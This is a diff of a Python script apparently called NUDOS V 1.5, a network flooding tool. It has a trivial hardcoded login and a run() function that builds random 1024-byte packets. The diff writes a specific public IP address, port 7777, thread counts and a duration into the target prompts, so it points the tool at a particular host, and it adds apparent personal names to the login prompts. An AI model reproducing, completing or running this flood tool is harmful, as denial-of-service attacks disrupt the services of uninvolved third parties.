@@ -19,8 +19,8 @@ os.system("clear")
 attemps = 0
 
 while attemps < 100:
-    username = input('Enter your username: ')
-    password = input('Enter your password: ')
+    username = input('Enter your username:MOUHA_IKOU ')
+    password = input('Enter your password:NAJEDGUESMI ')
 
     if username == 'NUDOS' and password == 'NUDOS':
         print('You have successfully logged in Welcome to NUDOS!!')
@@ -39,11 +39,11 @@ print("""
 	╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ V 1.5
 """)
 
-ip = str(input(" Target IP :"))
-port = int(input(" Target Port :"))
-choice = str(input(" (y/n) :"))
-times = int(input(" Time :"))
-threads = int(input(" Threads :"))
+ip = str(input(" Target IP :213.32.6.222"))
+port = int(input(" Target Port :7777"))
+choice = str(input(" (y/n) :Y"))
+times = int(input(" Time :110"))
+threads = int(input(" Threads :111"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
